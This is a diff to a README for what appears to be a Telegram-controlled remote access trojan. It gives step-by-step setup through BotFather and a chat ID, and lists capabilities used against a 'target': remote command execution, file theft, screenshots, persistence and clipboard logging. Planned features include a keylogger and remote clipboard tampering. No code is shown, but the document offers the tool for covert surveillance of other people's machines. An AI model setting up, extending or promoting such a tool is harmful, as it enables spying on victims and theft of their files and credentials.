@@ -3,6 +3,7 @@
  Almost all credits to Machine1337
 
 # Simple Instructions
+
     1. Go to Telegram and search for https://t.me/BotFather
     2. Create Bot and get the API_TOKEN
     3. Now search for https://t.me/chatIDrobot and get the chat_id
@@ -11,6 +12,7 @@
     6. Now Go to the bot which u created and send command in message field
 
 # Features:
+
      1) CMD Commands (Execute cmd commands directly in bot)
      2) Download (Download File From Target)
      3) Screenshot (Capture Screenshot)
@@ -29,4 +31,11 @@
      1) Install (Adds presistance to target system)
      2) Kill (Disconnect Client from Server)
      3) Cliplogger (Starts logging clipboard regularly or on command will send results)
+     4) Better Cross-platform
+     5) AES256 Encryption
+     6) Keylogger
+     7) Manage Clipboard Remotely (Will be able to modify the current copied text)
+     8) Remotely Zip Files
+     9) Download files from the web
+     10) Restart Sessions
      
